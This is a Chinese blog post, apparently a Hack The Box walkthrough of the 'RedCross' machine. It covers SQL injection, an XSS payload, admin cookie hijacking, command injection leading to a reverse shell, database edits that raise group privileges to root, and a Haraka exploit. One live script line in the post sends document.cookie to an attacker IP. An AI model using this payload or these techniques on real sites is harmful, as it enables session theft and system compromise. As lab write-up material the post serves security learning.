<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="htb walkthrough,">










<meta name="description" content="扫描端口信息：  修改/etc/hosts文件，访问web页面：   接下来分两个环节，一是子域名爆破，二是目录文件爆破 子域名爆破： gobuster: Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)   目录文件爆破：    先沿着目录文件爆破的结果进行，根据pdf文">
<meta name="keywords" content="htb walkthrough">
<meta property="og:type" content="article">
<meta property="og:title" content="htb-redcross-walkthrough">
<meta property="og:url" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/index.html">
<meta property="og:site_name" content="Ha0Za1-Pages">
<meta property="og:description" content="扫描端口信息：  修改/etc/hosts文件，访问web页面：   接下来分两个环节，一是子域名爆破，二是目录文件爆破 子域名爆破： gobuster: Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)   目录文件爆破：    先沿着目录文件爆破的结果进行，根据pdf文">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/nmap.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/hosts.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/page.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/gobuster.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/admin_page.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/gobuster_dir_1.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/gobuster_dir_2.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/account-signup.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/contact.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/guest.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/guestpage.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/dberror.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/sqli_1.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/sqli_2.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/sqli_3.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/message.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/input_payload.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/get_admin_cookie.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/hijack_session.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/guestsession.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/adminsession.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/adduser.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/adduser_result.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/ssh_test1.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/iptctl.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/bp_network.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/deny.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/reverseshell.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/action_php.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/psql.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/psql_1.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/etc_passwd.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/update.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/user_flag.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/sudo_group.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/root_flag.png">
<meta property="og:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/haraka.png">
<meta property="og:updated_time" content="2021-06-13T08:47:16.175Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="htb-redcross-walkthrough">
<meta name="twitter:description" content="扫描端口信息：  修改/etc/hosts文件，访问web页面：   接下来分两个环节，一是子域名爆破，二是目录文件爆破 子域名爆破： gobuster: Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)   目录文件爆破：    先沿着目录文件爆破的结果进行，根据pdf文">
<meta name="twitter:image" content="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/nmap.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/">





  <title>htb-redcross-walkthrough | Ha0Za1-Pages</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ha0Za1-Pages</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/13/htb-redcross-walkthrough/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ha0Za1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ha0Za1-Pages">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">htb-redcross-walkthrough</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-13T16:46:12+08:00">
                2021-06-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>扫描端口信息：</p>
<p><img src="nmap.png" alt="nmap"></p>
<p>修改<code>/etc/hosts</code>文件，访问web页面：</p>
<p><img src="hosts.png" alt="hosts"></p>
<p><img src="page.png" alt="page"></p>
<p>接下来分两个环节，一是子域名爆破，二是目录文件爆破</p>
<p><strong>子域名爆破：</strong></p>
<p><code>gobuster: Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)</code></p>
<p><img src="gobuster.png" alt="gobuster"></p>
<p><img src="admin_page.png" alt="admin_page"></p>
<p><strong>目录文件爆破：</strong></p>
<p><img src="gobuster_dir_1.png" alt="gobuster_dir_1"></p>
<p><img src="gobuster_dir_2.png" alt="gobuster_dir_2"></p>
<p><img src="account-signup.png" alt="account-signup"></p>
<p>先沿着目录文件爆破的结果进行，根据pdf文件的提示，此处可有两种方法可尝试。</p>
<p><strong>方法一：</strong></p>
<p>在contact页面内填入身份请求相关信息：</p>
<p><img src="contact.png" alt="contact"></p>
<p>得到guest账户信息：</p>
<p><img src="guest.png" alt="guest"></p>
<p>登录guest账户</p>
<p><img src="guestpage.png" alt="guestpage"></p>
<p>在<strong>UserID</strong>内填入信息可触发后台数据库错误：</p>
<p><img src="dberror.png" alt="dberror"></p>
<p>猜测此处会引入SQL Injection，直接上sqlmap：</p>
<p><img src="sqli_1.png" alt="sqli_1"></p>
<p><img src="sqli_2.png" alt="sqli_2"></p>
<p><img src="sqli_3.png" alt="sqli_3"></p>
<p>跑出一堆账户信息，可爆破哈希口令，但时间较长，且有更高效的方法。</p>
<p><strong>方法二：</strong></p>
<p>根据pdf最后的提示:</p>
<blockquote>
<p>It’s very important to follow this rules to get the account information as fast as possible, otherwise the message will be sent to our IT administrator who will take care if it when possible</p>
</blockquote>
<p>结合sqlmap爆出的数据库中message信息：</p>
<p><img src="message.png" alt="message"></p>
<p>猜测管理员页面存在可利用漏洞，填入畸形的message字段，管理员端会检查并触发相应漏洞。</p>
<p>经过尝试，为XSS</p>
<p>在<code>Contact phone or email</code>字段内填入恶意payload，触发xss，劫持到admin cookie：</p>
<script>new Image().src="http://10.10.14.14:8888/cookie.php?c="+document.cookie;</script>



<p><img src="input_payload.png" alt="input_payload"></p>
<p><img src="get_admin_cookie.png" alt="get_admin_cookie"></p>
<p>利用捕获的admin cookie成功登录<code>admin.redcross.htb</code>管理员页面</p>
<p><img src="hijack_session.png" alt="hijack_session"></p>
<p><strong>Broken Authentication</strong>，总而言之，这里的身份验证机制是存在漏洞的，还发现利用<code>intra.redcross.htb</code>的guest账户cookie也可登录<code>admin.redcross.htb</code>的admin账户：</p>
<p><img src="guestsession.png" alt="guestsession"></p>
<p><img src="adminsession.png" alt="adminsession"></p>
<p>进入管理员页面，在<strong>user management</strong>页面内可添加账户，并得到身份凭证：</p>
<p><img src="adduser.png" alt="adduser"></p>
<p><img src="adduser_result.png" alt="adduser_result"></p>
<p>利用<code>test1 : XtFphgAY</code>身份凭证，ssh登录到靶机内：</p>
<p><img src="ssh_test1.png" alt="ssh_test1"></p>
<p>得到一个受限的shell</p>
<p>找到<code>iptctl.c</code>文件，根据文件提示，其为<code>Admin -&gt; Network Access</code>页面功能的源码，审视源码，其<code>cmdAR</code>函数通过字符串拼接，构成命令行，可能构成Command Injection</p>
<p><img src="iptctl.png" alt="iptctl"></p>
<p><code>Network Access</code>页面请求：</p>
<p><img src="bp_network.png" alt="bp_network"></p>
<p><img src="deny.png" alt="deny"></p>
<p>实现命令行执行，执行python reverse shell，获取nc回连</p>
<p><img src="reverseshell.png" alt="reverseshell"></p>
<p>在靶机内的<code>action.php</code>文件内，找到了数据库身份凭证信息：</p>
<p><img src="action_php.png" alt="action_php"></p>
<p>成功登录数据库：</p>
<p><img src="psql.png" alt="psql"></p>
<p>查看用户信息表：</p>
<p><img src="psql_1.png" alt="psql_1"></p>
<p>发现test1用户的gid等信息，homedir表明了test1用户处于jail状态，因此尝试修改数据库信息</p>
<p>一是修改homedir信息，让用户逃出jail；二是修改gid，因此当前1001的gid状态权限受限，尝试调整为1000（参考<code>/etc/passwd</code>文件内<strong>penelope</strong>用户gid）</p>
<p><img src="etc_passwd.png" alt="etc_passwd"></p>
<p><img src="update.png" alt="update"></p>
<p>再次ssh test1用户：</p>
<p><img src="user_flag.png" alt="user_flag"></p>
<p>拿到了user flag</p>
<p>下一步，尝试修改test1的gid直接为root用户组，结果发现不可行。转变思路，利用sudo，查看sudo组的gid为27，利用sudo将test1切换为root用户：</p>
<p><img src="sudo_group.png" alt="sudo_group"></p>
<p><img src="root_flag.png" alt="root_flag"></p>
<p><strong>Haraka exploit</strong></p>
<p>上文中是通过管理员面板中Network Access功能的Command Injection漏洞获得出事user shell</p>
<p>这里还有另一种方式，即Haraka exploit</p>
<p>利用Network Access功能将本机IP地址添加到白名单后，目标的1025端口开放smtp Haraka服务，且相应版本存在可利用漏洞</p>
<p><img src="haraka.png" alt="haraka"></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/htb-walkthrough/" rel="tag"># htb walkthrough</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/06/13/htb-passage-walkthrough/" rel="next" title="htb-passage-walkthrough">
                <i class="fa fa-chevron-left"></i> htb-passage-walkthrough
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.JPG" alt="Ha0Za1">
            
              <p class="site-author-name" itemprop="name">Ha0Za1</p>
              <p class="site-description motion-element" itemprop="description">余不等伞，亦不等雨停</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Mo7Laviiin" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mo7laviiin</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
